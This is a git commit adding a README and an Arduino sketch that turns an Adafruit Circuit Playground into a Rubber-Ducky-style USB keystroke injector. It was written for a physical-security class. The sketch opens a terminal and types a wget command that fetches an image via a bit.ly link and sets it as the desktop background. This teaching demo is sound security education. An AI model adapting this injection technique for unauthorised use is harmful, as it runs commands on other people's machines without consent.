675941a755e8bd0614fd2a507590834f8e80fd3b
Alvaro Figueroa <alvaro@greencore.co.cr>
2016-09-04 23:42:31 -0600

    Initial playground-duck revision

--- README.md
+++ README.md
@@ -1,2 +1,13 @@
 # playground_ducky
 Adafruit Circuit Playground with USB attack a-la Ruber Ducky
+
+## Description
+Using Adafruit's Circuit Playground USB HID capabilities, we excecute a simple background change hack on the user's computer.
+
+This demo was created for teaching porpuses a Greencore Solutions (www.greencore.co.cr) in Costa Rica, for the IT Security Course, Physical Security class.
+
+The hack changes the desktop background to a Teletubbies image that it downloads from Wikipedia using wget. This is to celebrate an early costarican hacker group called FuerzaG headed by Alf Delgado.
+
+It should work on GNU/Linux with a Gnome environment. Tested on ubuntu-gnome and Arch with Cinnamon.
+
+Please let me know if you would like me to adapt any other popular Rubber Ducky example to this board.
---
+++ playground-ducky/playground-ducky.ino
@@ -0,0 +1,42 @@
+// Playground Ducky
+//
+// Inspirado en el funcionamiento del Rubber Ducky, se utiliza un Adafruit Circuit Playground
+// con ATMega 32u4 con capacidad de emular teclado y mouse USB
+// El ataque ha sido personalizado para las estaciones de trabajo de Greencore Solutions
+// para el curso de Seguridad Informática, clase de Seguridad Física
+
+
+
+#include <Adafruit_CircuitPlayground.h>
+#include <Wire.h>
+#include <SPI.h>
+#include <Keyboard.h>
+
+void setup() {
+  Keyboard.begin();          // Iniciamos funcionalidad de teclado
+  CircuitPlayground.begin(); // Iniciamos funciones del Playground, necesario para luces más adelante
+  delay(1000);               // Esperamos un segundo a que el equipo nos registre como teclado
+  Keyboard.write(0x83);      // Caracter de "KEY_LEFT_GUI"
+  delay(1300);               // Algunos basados en Gnome se toman su tiempo
+  Keyboard.write(0xB0);      // Enter nos lleva a escribir
+  delay(1000);
+  Keyboard.print("terminal");// Abrimos una terminal
+  Keyboard.write(0xB0);      // Y damos enter
+  delay(1000);
+  Keyboard.print("wget -O tele.jpg http://bit.ly/2c7nVwO && gsettings set org.gnome.desktop.background picture-uri file://$(pwd)/tele.jpg && exit");
+  Keyboard.write(0xB0);      // Fondo de los teletubies, castigo de Alf Delgado en FuerzaG :)
+  Keyboard.println("");
+  Keyboard.end();
+}
+
+void loop() {
+    // Luego del ataque, distraemos con luces y colores
+    uint32_t offset = millis() / 5;
+    for(int i=0; i<10; ++i) {
+      CircuitPlayground.strip.setPixelColor(i, CircuitPlayground.colorWheel(((i * 256 / 10) + offset) & 255));
+    }
+    // Show all the pixels.
+    CircuitPlayground.strip.show();
+}
+
+
